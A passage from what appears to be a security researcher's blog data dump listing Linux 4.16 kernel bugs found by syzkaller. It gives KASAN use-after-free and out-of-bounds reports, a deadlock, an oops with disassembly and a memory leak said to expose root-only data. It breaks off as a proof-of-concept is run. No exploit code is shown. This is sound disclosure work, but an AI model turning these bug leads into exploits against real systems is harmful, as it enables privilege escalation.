(&rp->fetch_lock){+.+.}, at: mon_bin_read+0x5e/0x5f0 drivers/usb/mon/mon_bin.c:813\n\nwhich lock already depends on the new lock.\n\n\nthe existing dependency chain (in reverse order) is:\n\n-> #1 (&rp->fetch_lock){+.+.}:\n\n-> #0 (&mm->mmap_sem){++++}:\n\nother info that might help us debug this:\n\n Possible unsafe locking scenario:\n\n       CPU0                    CPU1\n       ----                    ----\n  lock(&rp->fetch_lock);\n                               lock(&mm->mmap_sem);\n                               lock(&rp->fetch_lock);\n  lock(&mm->mmap_sem);\n\n *** DEADLOCK ***\n\n1 lock held by syz-executor3/12637:\n #0: 00000000edee7e51 (&rp->fetch_lock){+.+.}, at: mon_bin_read+0x5e/0x5f0 drivers/usb/mon/mon_bin.c:813\n\nstack backtrace:\nCPU: 0 PID: 12637 Comm: syz-executor3 Not tainted 4.16.0+ #28\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n __dump_stack lib/dump_stack.c:17 [inline]\n dump_stack+0x11b/0x201 lib/dump_stack.c:53\n print_circular_bug.isra.33+0x3fe/0x437 kernel/locking/lockdep.c:1223\n check_prev_add kernel/locking/lockdep.c:1863 [inline]\n check_prevs_add kernel/locking/lockdep.c:1976 [inline]\n validate_chain kernel/locking/lockdep.c:2417 [inline]\n __lock_acquire.cold.54+0x5b3/0x90e kernel/locking/lockdep.c:3431\nunregister_netdevice: waiting for lo to become free. Usage count = 3\n```\n\n**End**\n\n\n## strlen - slab out of bounds Read\n\nGot from syzkaller & Found in *LK v4.16.0*.\n\n### Call Trace (Dump)\n\n```c\n[   66.494709] BUG: KASAN: slab-out-of-bounds in strlen+0x8e/0xa0\n[   66.495406] Read of size 1 at addr ffff88007be71348 by task syz-executor0/12148\n[   66.496244] \n[   66.496444] CPU: 1 PID: 12148 Comm: syz-executor0 Not tainted 4.16.0+ #28\n[   66.497263] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[   66.498275] Call Trace:\n[   66.498584]  dump_stack+0x11b/0x201\n[   66.499017]  ? dma_direct_map_sg+0x26f/0x26f\n[   66.499527]  ? show_regs_print_info+0x12/0x12\n[   66.500078]  print_address_description+0x60/0x224\n[   66.500642]  kasan_report+0x196/0x2a0\n[   66.501095]  ? strlen+0x8e/0xa0\n[   66.501484]  ? strlen+0x8e/0xa0\n[   66.501873]  ? kstrdup+0x21/0x70\n[   66.502291]  ? alloc_trace_kprobe+0x131/0xa10\n[   66.502808]  ? kprobe_dispatcher+0x110/0x110\n[   66.503344]  ? perf_kprobe_init+0x82/0x1f0\n[   66.503821]  ? create_local_trace_kprobe+0xa8/0x4c0\n[   66.504394]  ? alloc_symbol_cache+0x1c0/0x1c0\n[   66.504905]  ? perf_kprobe_init+0x82/0x1f0\n[   66.505428]  ? kmem_cache_alloc_trace+0x116/0x2b0\n[   66.506004]  ? perf_kprobe_init+0x147/0x1f0\n[   66.506503]  ? rcu_seq_end+0x120/0x120\n[   66.506962]  ? perf_kprobe_event_init+0xa8/0x120\n[   66.507511]  ? perf_try_init_event+0xcb/0x2a0\n[   66.508041]  ? perf_event_alloc+0x1623/0x2540\n[   66.508583]  ? perf_try_init_event+0x2a0/0x2a0\n[   66.509110]  ? lock_acquire+0x4a0/0x4a0\n[   66.509591]  ? mutex_lock_io_nested+0x16b0/0x16b0\n[   66.510160]  ? perf_trace_lock_acquire+0xeb/0x930\n[   66.510733]  ? perf_trace_lock_acquire+0xeb/0x930\n[   66.511321]  ? perf_trace_lock+0x950/0x950\n[   66.511812]  ? save_trace+0x300/0x300\n[   66.512276]  ? save_trace+0x300/0x300\n[   66.512777]  ? find_held_lock+0x32/0x1b0\n[   66.513288]  ? ptrace_may_access+0x33/0x40\n[   66.513784]  ? lock_acquire+0x4a0/0x4a0\n[   66.514268]  ? do_raw_spin_unlock+0xac/0x310\n[   66.514819]  ? do_raw_spin_trylock+0x1b0/0x1b0\n[   66.515361]  ? __ptrace_may_access+0x48d/0x7d0\n[   66.515963]  ? SYSC_perf_event_open+0x48d/0x2ab0\n[   66.516552]  ? perf_event_set_output+0x580/0x580\n[   66.517119]  ? schedule+0xf0/0x3a0\n[   66.517609]  ? SyS_futex+0x261/0x31e\n[   66.518039]  ? SyS_futex+0x26a/0x31e\n[   66.518500]  ? exit_to_usermode_loop+0x139/0x1e0\n[   66.519050]  ? do_futex+0x1f50/0x1f50\n[   66.519518]  ? exit_to_usermode_loop+0x181/0x1e0\n[   66.520080]  ? syscall_slow_exit_work+0x400/0x400\n[   66.520668]  ? do_syscall_64+0xb0/0x7a0\n[   66.521148]  ? SYSC_perf_event_open+0x2ab0/0x2ab0\n[   66.521700]  ? do_syscall_64+0x23e/0x7a0\n[   66.522186]  ? _raw_spin_unlock_irq+0x24/0x40\n[   66.522736]  ? finish_task_switch+0x1c7/0x750\n[   66.523270]  ? syscall_return_slowpath+0x470/0x470\n[   66.523899]  ? syscall_return_slowpath+0x2df/0x470\n[   66.524542]  ? prepare_exit_to_usermode+0x330/0x330\n[   66.525148]  ? entry_SYSCALL_64_after_hwframe+0x52/0xb7\n[   66.525808]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[   66.526395]  ? entry_SYSCALL_64_after_hwframe+0x42/0xb7\n[   66.527080] \n[   66.527297] Allocated by task 12148:\n[   66.527749]  kasan_kmalloc+0xbf/0xe0\n[   66.528187]  kmem_cache_alloc_trace+0x116/0x2b0\n[   66.528795]  perf_kprobe_init+0x82/0x1f0\n[   66.529328]  perf_kprobe_event_init+0xa8/0x120\n[   66.529854]  perf_try_init_event+0xcb/0x2a0\n[   66.530401]  perf_event_alloc+0x1623/0x2540\n[   66.530889]  SYSC_perf_event_open+0x48d/0x2ab0\n[   66.531430]  do_syscall_64+0x23e/0x7a0\n[   66.531836] \n[   66.532015] Freed by task 18:\n[   66.532368]  __kasan_slab_free+0x12c/0x170\n[   66.532857]  kfree+0xf3/0x310\n[   66.533193]  rcu_process_callbacks+0x9b4/0x25b0\n[   66.533706]  __do_softirq+0x2a3/0xa8b\n[   66.534104] \n[   66.534257] The buggy address belongs to the object at ffff88007be712c8\n[   66.534257]  which belongs to the cache kmalloc-128 of size 128\n[   66.535590] The buggy address is located 0 bytes to the right of\n[   66.535590]  128-byte region [ffff88007be712c8, ffff88007be71348)\n[   66.536688] The buggy address belongs to the page:\n[   66.537323] page:ffffea0001ef9c00 count:1 mapcount:0 mapping:0000000000000000 index:0xffff88007be701e8 compound_mapcount: 0\n[   66.538824] flags: 0x500000000008100(slab|head)\n[   66.539438] raw: 0500000000008100 0000000000000000 ffff88007be701e8 0000000100110006\n[   66.540500] raw: ffffea0001f716a0 ffff88007f800980 ffff88002800f480 0000000000000000\n[   66.541612] page dumped because: kasan: bad access detected\n[   66.542354] \n[   66.542581] Memory state around the buggy address:\n[   66.543224]  ffff88007be71200: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n[   66.544213]  ffff88007be71280: fc fc fc fc fc fc fc fc fc 00 00 00 00 00 00 00\n[   66.545299] >ffff88007be71300: 00 00 00 00 00 00 00 00 00 fc fc fc fc fc fc fc\n[   66.546268]                                               ^\n[   66.546962]  ffff88007be71380: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n[   66.547667]  ffff88007be71400: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n```\n\n**End**\n\n\n## xxx - slab padding overwritten\n\nGot from syzkaller & Found in *LK v4.16.0*. \n\n### Call Trace (Dump)\n\n```c\n[  232.959395] BUG selinux_file_security (Not tainted): Padding overwritten. 0x00000000ee4aa18f-0x000000003704f4a5\n[  232.960284] -----------------------------------------------------------------------------\n[  232.960284] \n[  232.961111] Disabling lock debugging due to kernel taint\n[  232.961552] INFO: Slab 0x00000000a9c66b55 objects=22 used=22 fp=0x          (null) flags=0x100000000008101\n[  232.962383] CPU: 0 PID: 12841 Comm: syz-executor7 Tainted: G    B            4.16.0+ #28\n[  232.963070] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[  232.963773] Call Trace:\n[  232.964002]  dump_stack+0x11b/0x201\n[  232.964294]  ? dma_direct_map_sg+0x26f/0x26f\n[  232.964642]  slab_err+0xab/0xcf\n[  232.964931]  ? memchr_inv+0x264/0x330\n[  232.965242]  slab_pad_check.part.45.cold.81+0x23/0x75\n[  232.965664]  ? check_slab+0xa4/0xd0\n[  232.965962]  ? free_debug_processing+0x1f7/0x270\n[  232.966343]  ? qlist_free_all+0x32/0xc0\n[  232.966656]  ? __slab_free+0x241/0x390\n[  232.966974]  ? mark_held_locks+0xa8/0xf0\n[  232.967296]  ? _raw_spin_unlock_irqrestore+0x46/0x60\n[  232.967698]  ? qlist_free_all+0x32/0xc0\n[  232.968041]  ? qlist_free_all+0x32/0xc0\n[  232.968360]  ? qlist_free_all+0x47/0xc0\n[  232.968676]  ? quarantine_reduce+0x166/0x1a0\n[  232.969032]  ? kasan_kmalloc+0x95/0xe0\n[  232.969342]  ? __pmd_alloc+0x8c/0x4d0\n[  232.969644]  ? kmem_cache_alloc+0xde/0x2a0\n[  232.969989]  ? __pmd_alloc+0x8c/0x4d0\n[  232.970312]  ? __pud_alloc+0x187/0x240\n[  232.970639]  ? __handle_mm_fault+0x12e5/0x3210\n[  232.971040]  ? debug_check_no_locks_freed+0x210/0x210\n[  232.971451]  ? vm_insert_mixed_mkwrite+0x30/0x30\n[  232.971821]  ? deref_stack_reg+0xab/0x110\n[  232.972188]  ? update_curr+0x30f/0xa60\n[  232.972496]  ? nohz_balance_exit_idle.part.84+0x3d0/0x3d0\n[  232.972953]  ? print_usage_bug+0x140/0x140\n[  232.973299]  ? rcu_process_callbacks+0x25b0/0x25b0\n[  232.973690]  ? __save_stack_trace+0x7d/0xf0\n[  232.974105]  ? follow_huge_addr+0x5/0x10\n[  232.974537]  ? follow_page_mask+0x129/0x14f0\n[  232.975006]  ? save_trace+0x300/0x300\n[  232.975428]  ? save_trace+0x300/0x300\n[  232.975864]  ? gup_pgd_range+0x2430/0x2430\n[  232.976380]  ? pick_next_task_fair+0xf17/0x1770\n[  232.976894]  ? save_trace+0x300/0x300\n[  232.977297]  ? __lock_is_held+0xad/0x140\n[  232.977741]  ? handle_mm_fault+0x12e/0x390\n[  232.978215]  ? __get_user_pages+0x619/0x13f0\n[  232.978720]  ? follow_page_mask+0x14f0/0x14f0\n[  232.979226]  ? _raw_spin_unlock_irq+0x24/0x40\n[  232.979730]  ? finish_task_switch+0x186/0x750\n[  232.980240]  ? set_load_weight+0x270/0x270\n[  232.980690]  ? lock_repin_lock+0x410/0x410\n[  232.981041]  ? __schedule+0x752/0x1d10\n[  232.981407]  ? rcu_is_watching+0x81/0x130\n[  232.981741]  ? __lock_is_held+0xad/0x140\n[  232.982072]  ? get_user_pages_remote+0x1fe/0x3b0\n[  232.982447]  ? copy_strings.isra.24+0x352/0xc10\n[  232.982809]  ? remove_arg_zero+0x5c0/0x5c0\n[  232.983158]  ? fsnotify+0x3b0/0x11a0\n[  232.983531]  ? fsnotify_first_mark+0x2c0/0x2c0\n[  232.983940]  ? vfs_read+0x15f/0x330\n[  232.984224]  ? kernel_read+0xa6/0x110\n[  232.984523]  ? prepare_binprm+0x654/0x8d0\n[  232.984855]  ? install_exec_creds+0x160/0x160\n[  232.985209]  ? copy_strings_kernel+0xa0/0x110\n[  232.985562]  ? do_execveat_common.isra.33+0x120c/0x2320\n[  232.985998]  ? __do_page_fault+0xb70/0xb70\n[  232.986415]  ? prepare_bprm_creds+0x110/0x110\n[  232.986857]  ? deactivate_slab.isra.67+0x47c/0x5b0\n[  232.987210]  ? retint_kernel+0x10/0x10\n[  232.987494]  ? trace_hardirqs_on_thunk+0x1a/0x1c\n[  232.987831]  ? __do_page_fault+0x39a/0xb70\n[  232.988181]  ? retint_kernel+0x10/0x10\n[  232.988468]  ? strncpy_from_user+0x172/0x400\n[  232.988854]  ? strncpy_from_user+0x2f1/0x400\n[  232.989296]  ? rcu_pm_notify+0xc0/0xc0\n[  232.989656]  ? mpi_free.cold.1+0x21/0x21\n[  232.990012]  ? rcu_read_lock_sched_held+0xe4/0x120\n[  232.990402]  ? getname_flags+0x24d/0x560\n[  232.990741]  ? SyS_execve+0x34/0x40\n[  232.991069]  ? compat_SyS_execveat+0x60/0x60\n[  232.991426]  ? do_syscall_64+0x23e/0x7a0\n[  232.991740]  ? _raw_spin_unlock_irq+0x24/0x40\n[  232.992121]  ? finish_task_switch+0x1c7/0x750\n[  232.992480]  ? syscall_return_slowpath+0x470/0x470\n[  232.992882]  ? syscall_return_slowpath+0x2df/0x470\n[  232.993265]  ? prepare_exit_to_usermode+0x330/0x330\n[  232.993644]  ? retint_user+0x18/0x18\n[  232.993927]  ? async_page_fault+0x2f/0x50\n[  232.994223]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[  232.994576]  ? entry_SYSCALL_64_after_hwframe+0x42/0xb7\n[  232.994971] Padding 00000000ee4aa18f: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n[  232.995651] Padding 000000009a3fbdea: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n[  232.996335] Padding 0000000092deced6: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n[  232.997092] Padding 00000000c723a940: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n[  232.997825] Padding 000000007de31a44: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n[  232.998536] Padding 0000000097ccfd3f: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n[  232.999221] FIX selinux_file_security: Restoring 0x00000000ee4aa18f-0x000000003704f4a5=0x5a\n```\n\n**End**\n","excerpt":"anon_vma_chain - memory leak Found in LK v4.16.0-rc7. Call Trace (Dump) End kmalloc-1024 - slab padding/red zone overwritten Got from syzka…","fields":{"slug":"/2018-04-1-Founds/"},"frontmatter":{"date":"Apr 02, 2018","title":"Linux Kernel - 2018-04-1 Founds","tags":["Security","Linux-Kernel"],"update":"Apr 07, 2018"},"timeToRead":38}},{"node":{"rawMarkdownBody":"\n## skb_release_data - use after free Write\n\nGot from syzkaller & Found in LK v4.16.0.\n\n[2018-04-10] Maybe, it is *reproducible* under some conditions :( So it needs more works to be generic PoC.\n\n### Call Trace (Dump)\n\n```c\nBUG: KASAN: use-after-free in atomic_sub_return include/asm-generic/atomic-instrumented.h:258 [inline]\nBUG: KASAN: use-after-free in skb_release_data+0x15f/0x740 net/core/skbuff.c:559\nWrite of size 4 at addr ffff880079c4f6e8 by task syz-executor4/16207\n\nCPU: 1 PID: 16207 Comm: syz-executor4 Not tainted 4.16.0+ #28\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n __dump_stack lib/dump_stack.c:17 [inline]\n dump_stack+0x11b/0x201 lib/dump_stack.c:53\n print_address_description+0x60/0x224 mm/kasan/report.c:256\n kasan_report_error mm/kasan/report.c:354 [inline]\n kasan_report+0x196/0x2a0 mm/kasan/report.c:412\n\nAllocated by task 16207:\n set_track mm/kasan/kasan.c:459 [inline]\n kasan_kmalloc+0xbf/0xe0 mm/kasan/kasan.c:552\n slab_post_alloc_hook mm/slab.h:443 [inline]\n slab_alloc_node mm/slub.c:2725 [inline]\n __kmalloc_node_track_caller+0x11c/0x3b0 mm/slub.c:4338\n __kmalloc_reserve.isra.41+0x37/0xc0 net/core/skbuff.c:137\n __alloc_skb+0x11b/0x6c0 net/core/skbuff.c:205\n alloc_skb include/linux/skbuff.h:987 [inline]\n alloc_skb_with_frags+0x102/0x640 net/core/skbuff.c:5248\n sock_alloc_send_pskb+0x743/0x950 net/core/sock.c:2088\n packet_alloc_skb net/packet/af_packet.c:2803 [inline]\n packet_snd net/packet/af_packet.c:2894 [inline]\n packet_sendmsg+0x22a1/0x5960 net/packet/af_packet.c:2969\n sock_sendmsg_nosec net/socket.c:629 [inline]\n sock_sendmsg+0xc0/0x100 net/socket.c:639\n __sys_sendto+0x340/0x540 net/socket.c:1789\n SYSC_sendto net/socket.c:1801 [inline]\n SyS_sendto+0x3b/0x50 net/socket.c:1797\n do_syscall_64+0x23e/0x7a0 arch/x86/entry/common.c:287\n\nFreed by task 16207:\n set_track mm/kasan/kasan.c:459 [inline]\n __kasan_slab_free+0x12c/0x170 mm/kasan/kasan.c:520\n slab_free_hook mm/slub.c:1393 [inline]\n slab_free_freelist_hook mm/slub.c:1414 [inline]\n slab_free mm/slub.c:2968 [inline]\n kfree+0xf3/0x310 mm/slub.c:3917\n skb_free_head+0x83/0xa0 net/core/skbuff.c:550\n skb_release_data+0x57d/0x740 net/core/skbuff.c:570\n skb_release_all+0x46/0x60 net/core/skbuff.c:627\n __kfree_skb net/core/skbuff.c:641 [inline]\n consume_skb+0x153/0x490 net/core/skbuff.c:701\n packet_rcv+0x152/0x1570 net/packet/af_packet.c:2162\n dev_queue_xmit_nit+0x84f/0xbe0 net/core/dev.c:2018\n xmit_one net/core/dev.c:3049 [inline]\n dev_hard_start_xmit+0x15a/0xa30 net/core/dev.c:3069\n __dev_queue_xmit+0xe2f/0x2680 net/core/dev.c:3584\n\nThe buggy address belongs to the object at ffff880079c4f608\n which belongs to the cache kmalloc-512 of size 512\nThe buggy address is located 224 bytes inside of\n 512-byte region [ffff880079c4f608, ffff880079c4f808)\nThe buggy address belongs to the page:\npage:ffffea0001e71300 count:1 mapcount:0 mapping:0000000000000000 index:0xffff880079c4f968 compound_mapcount: 0\nflags: 0x500000000008100(slab|head)\nraw: 0500000000008100 0000000000000000 ffff880079c4f968 0000000100120010\nraw: ffffea0001e55620 ffff88007f8014c0 ffff88002dc0ce00 0000000000000000\npage dumped because: kasan: bad access detected\n\nMemory state around the buggy address:\n ffff880079c4f580: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n ffff880079c4f600: fc fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n>ffff880079c4f680: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n                                                          ^\n ffff880079c4f700: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n ffff880079c4f780: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n```\n\n\n## uprobe_perf_close - use after free Read\n\nGot from syzkaller & Found in LK v4.16.0.\n\n### Call Trace (Dump)\n\n```c\nBUG: KASAN: use-after-free in uprobe_perf_close+0x3de/0x520 kernel/trace/trace_uprobe.c:1048\nRead of size 4 at addr ffff88007a4baf0c by task syzkaller591669/2952\n\nCPU: 1 PID: 2952 Comm: syzkaller591669 Not tainted 4.16.0+ #28\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n __dump_stack lib/dump_stack.c:17 [inline]\n dump_stack+0x11b/0x201 lib/dump_stack.c:53\n print_address_description+0x60/0x224 mm/kasan/report.c:256\n kasan_report_error mm/kasan/report.c:354 [inline]\n kasan_report+0x196/0x2a0 mm/kasan/report.c:412\n\nAllocated by task 2952:\n set_track mm/kasan/kasan.c:459 [inline]\n kasan_kmalloc+0xbf/0xe0 mm/kasan/kasan.c:552\n slab_post_alloc_hook mm/slab.h:443 [inline]\n slab_alloc_node mm/slub.c:2725 [inline]\n kmem_cache_alloc_node+0x125/0x2f0 mm/slub.c:2761\n alloc_task_struct_node kernel/fork.c:157 [inline]\n dup_task_struct kernel/fork.c:770 [inline]\n copy_process.part.47+0x159a/0x2730 kernel/fork.c:1631\n copy_process kernel/fork.c:1606 [inline]\n _do_fork+0x208/0x1000 kernel/fork.c:2087\n do_syscall_64+0x23e/0x7a0 arch/x86/entry/common.c:287\n\nFreed by task 9:\n set_track mm/kasan/kasan.c:459 [inline]\n __kasan_slab_free+0x12c/0x170 mm/kasan/kasan.c:520\n slab_free_hook mm/slub.c:1393 [inline]\n slab_free_freelist_hook mm/slub.c:1414 [inline]\n slab_free mm/slub.c:2968 [inline]\n kmem_cache_free+0xbf/0x2e0 mm/slub.c:2990\n free_task_struct kernel/fork.c:162 [inline]\n free_task+0x142/0x1b0 kernel/fork.c:391\n __put_task_struct+0x2a4/0x580 kernel/fork.c:657\n put_task_struct include/linux/sched/task.h:96 [inline]\n delayed_put_task_struct+0x2f7/0x3d0 kernel/exit.c:180\n __rcu_reclaim kernel/rcu/rcu.h:178 [inline]\n rcu_do_batch kernel/rcu/tree.c:2675 [inline]\n invoke_rcu_callbacks kernel/rcu/tree.c:2930 [inline]\n __rcu_process_callbacks kernel/rcu/tree.c:2897 [inline]\n rcu_process_callbacks+0xb29/0x25b0 kernel/rcu/tree.c:2914\n __do_softirq+0x2a3/0xa8b kernel/softirq.c:285\n\nThe buggy address belongs to the object at ffff88007a4baec0\n which belongs to the cache task_struct of size 5504\nThe buggy address is located 76 bytes inside of\n 5504-byte region [ffff88007a4baec0, ffff88007a4bc440)\nThe buggy address belongs to the page:\npage:ffffea0001e92e00 count:1 mapcount:0 mapping:0000000000000000 index:0x0 compound_mapcount: 0\nflags: 0x500000000008100(slab|head)\nraw: 0500000000008100 0000000000000000 0000000000000000 0000000100050005\nraw: ffffea0001f32a20 ffff88007f835960 ffff88007f85c040 0000000000000000\npage dumped because: kasan: bad access detected\n\nMemory state around the buggy address:\n ffff88007a4bae00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n ffff88007a4bae80: fc fc fc fc fc fc fc fc fb fb fb fb fb fb fb fb\n>ffff88007a4baf00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n                      ^\n ffff88007a4baf80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n ffff88007a4bb000: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n```\n\n**End**\n\n\n## alloc_vmap_area - unable to handle kernel paging request\n\nFound on LK v4.16.0. Seems weird...\n\n### Call Trace (Dump)\n\n```c\n[  420.823887] BUG: unable to handle kernel paging request at ffffffffffffffd0\n[  420.824743] PGD 29e24067 P4D 29e24067 PUD 29e26067 PMD 0 \n[  420.825278] Oops: 0000 [#1] SMP KASAN PTI\n[  420.825627] Dumping ftrace buffer:\n[  420.825932]    (ftrace buffer empty)\n[  420.826243] Modules linked in:\n[  420.826507] CPU: 1 PID: 2313 Comm: poc Tainted: G    B            4.16.0+ #28\n[  420.827179] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[  420.827905] RIP: 0010:alloc_vmap_area+0x2eb/0x820\n[  420.828341] RSP: 0018:ffff880024c37750 EFLAGS: 00010213\n[  420.828812] RAX: 1ffffffffffffffa RBX: ffffffffffffffd0 RCX: ffffffffb96ce6f4\n[  420.829424] RDX: 0000000000000000 RSI: 0000000000000004 RDI: ffff880079c323b8\n[  420.830008] RBP: 0000000000002000 R08: fffffbfff792f555 R09: fffffbfff792f554\n[  420.830667] R10: ffffffffbc97aaa3 R11: 1ffffffff792f554 R12: 0000000000000000\n[  420.831289] R13: dffffc0000000000 R14: 0000000000000000 R15: 0000000000000000\n[  420.831928] FS:  0000000000cb8940(0000) GS:ffff88007fc00000(0000) knlGS:0000000000000000\n[  420.832693] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\n[  420.833228] CR2: ffffffffffffffd0 CR3: 0000000019976000 CR4: 00000000000006e0\n[  420.833827] DR0: 0000000020000100 DR1: 0000000020000100 DR2: 0000000000000000\n[  420.834455] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000600\n[  420.835040] Call Trace:\n[  420.835286]  ? purge_vmap_area_lazy+0x40/0x40\n[  420.835654]  ? __get_vm_area_node+0xab/0x340\n[  420.836048]  ? kmem_cache_alloc_node_trace+0x169/0x300\n[  420.836514]  ? __get_vm_area_node+0xe5/0x340\n[  420.836883]  ? __vmalloc_node_range+0xaf/0x6d0\n[  420.837290]  ? alloc_counters.isra.10+0xad/0x6b0\n[  420.837682]  ? __might_fault+0x104/0x1b0\n[  420.838047]  ? alloc_counters.isra.10+0xad/0x6b0\n[  420.838452]  ? vzalloc+0x63/0x80\n[  420.838745]  ? alloc_counters.isra.10+0xad/0x6b0\n[  420.839131]  ? alloc_counters.isra.10+0xad/0x6b0\n[  420.839547]  ? __lockdep_init_map+0xdf/0x4d0\n[  420.839896]  ? ipt_error+0x20/0x20\n[  420.840203]  ? xt_find_table_lock+0x108/0x3e0\n[  420.840582]  ? do_ipt_get_ctl+0x6c1/0x9e0\n[  420.840911]  ? module_unload_free+0x510/0x510\n[  420.841309]  ? get_info+0x610/0x610\n[  420.841596]  ? lock_acquire+0x1a5/0x4a0\n[  420.841928]  ? lock_acquire+0x4a0/0x4a0\n[  420.842279]  ? lock_downgrade+0x6e0/0x6e0\n[  420.842630]  ? __do_page_fault+0x302/0xb70\n[  420.842988]  ? nf_getsockopt+0x62/0xc0\n[  420.843332]  ? ip_getsockopt+0x14e/0x1f0\n[  420.843680]  ? do_ip_getsockopt+0x1fd0/0x1fd0\n[  420.844046]  ? sock_alloc_file+0x28e/0x4c0\n[  420.844448]  ? tcp_getsockopt+0x7b/0xc0\n[  420.844848]  ? __sys_getsockopt+0x153/0x310\n[  420.845282]  ? up_read+0x17/0x110\n[  420.845674]  ? kernel_setsockopt+0x1b0/0x1b0\n[  420.846125]  ? __sys_socket+0x156/0x1f0\n[  420.846458]  ? security_file_ioctl+0x76/0xb0\n[  420.846818]  ? syscall_slow_exit_work+0x400/0x400\n[  420.847222]  ? SyS_getsockopt+0x32/0x40\n[  420.847544]  ? __sys_getsockopt+0x310/0x310\n[  420.847893]  ? do_syscall_64+0x23e/0x7a0\n[  420.848223]  ? trace_hardirqs_on_thunk+0x1a/0x1c\n[  420.848610]  ? syscall_return_slowpath+0x470/0x470\n[  420.849075]  ? __do_page_fault+0x39a/0xb70\n[  420.849428]  ? syscall_return_slowpath+0x2df/0x470\n[  420.849852]  ? prepare_exit_to_usermode+0x330/0x330\n[  420.850274]  ? prepare_exit_to_usermode+0x22b/0x330\n[  420.850699]  ? perf_trace_sys_enter+0xc30/0xc30\n[  420.851101]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[  420.851513]  ? entry_SYSCALL_64_after_hwframe+0x42/0xb7\n[  420.852062] Code: 60 aa 97 bc 0f 84 55 02 00 00 49 8d 5c 24 d0 e8 dc 19 d4 ff 48 89 d8 48 c1 e8 03 42 80 3c 28 00 0f 85 75 04 00 00 48 3b 6c 24 10 <4d> 8b 64 24 d0 0f 87 29 02 00 00 4c 39 e5 0f 86 20 02 00 00 e8 \n[  420.854196] RIP: alloc_vmap_area+0x2eb/0x820 RSP: ffff880024c37750\n[  420.854875] CR2: ffffffffffffffd0\n[  420.855247] ---[ end trace efc5824732863059 ]---\n[  420.855755] Kernel panic - not syncing: Fatal exception\n[  420.856303] Dumping ftrace buffer:\n[  420.856645]    (ftrace buffer empty)\n[  420.856980] Kernel Offset: 0x38000000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\n[  420.857911] Rebooting in 86400 seconds..\n```\n\n### Code\n\n```c\n   0:   60                      (bad)  \n   1:   aa                      stos   BYTE PTR es:[rdi],al\n   2:   97                      xchg   edi,eax\n   3:   bc 0f 84 55 02          mov    esp,0x255840f\n   8:   00 00                   add    BYTE PTR [rax],al\n   a:   49 8d 5c 24 d0          lea    rbx,[r12-0x30]\n   f:   e8 dc 19 d4 ff          call   0xffffffffffd419f0\n  14:   48 89 d8                mov    rax,rbx\n  17:   48 c1 e8 03             shr    rax,0x3\n  1b:   42 80 3c 28 00          cmp    BYTE PTR [rax+r13*1],0x0\n  20:   0f 85 75 04 00 00       jne    0x49b\n  26:   48 3b 6c 24 10          cmp    rbp,QWORD PTR [rsp+0x10]\n  2b:  *4d 8b 64 24 d0          mov    r12,QWORD PTR [r12-0x30]\n  30:   0f 87 29 02 00 00       ja     0x25f\n  36:   4c 39 e5                cmp    rbp,r12\n  39:   0f 86 20 02 00 00       jbe    0x25f\n  3f:   e8                      .byte 0xe8\n```\n\n\n\n## xxx - memory leak\n\nFound on LK v4.16.x. Leaked bytes seem like the part of the Kprobe-tracing event logs.\n\n```c\n> /sys/kernel/debug/tracing/events/kprobes/myprobe/format\n...\nprint fmt: \"(%lx) dfd=%lx filename=%lx flags=%lx mode=%lx\", REC->__probe_ip,\nREC->dfd, REC->filename, REC->flags, REC->mode\n...\n```\n\nMaybe,`that file cannot be opened without *root* perm, but its contents just leaked with Medium IL...\n\nOf course, enabling some ops to support kprobe stuff so that using kprobe-tracing.\n\n### Call Trace (Dump)\n\n```c\n[   98.213278] kmemleak: 1 new suspected memory leaks (see /sys/kernel/debug/kmemleak)\n[  104.438838] kmemleak: 2 new suspected memory leaks (see /sys/kernel/debug/kmemleak)\n...\n  hex dump (first 32 bytes):\n    22 28 25 6c 78 29 22 2c 20 52 45 43 2d 3e 5f 5f  \"(%lx)\", REC->__\n    70 72 6f 62 65 5f 69 70 00 6b 6b 6b 6b 6b 6b a5  probe_ip.kkkkkk.\n```\n\n**End**\n\n\n## process_preds - slab out of bounds Write / use after free Read/Write\n\nFound in *LK v4.16.0*.\n\n### Call Trace (Dump)\n\n```c\nzero@zer0day:/tmp$ uname -a\nLinux zer0day 4.16.0+ #30 SMP Fri Apr 13 14:35:45 KST 2018 x86_64 GNU/Linux\nzero@zer0day:/tmp$ id\nuid=1000(zero) gid=1000(zero) groups=1000(zero)\nzero@zer0day:/tmp$ gcc -o poc poc.c\nzero@zer0day:/tmp$ ./poc\n[  123.540060] 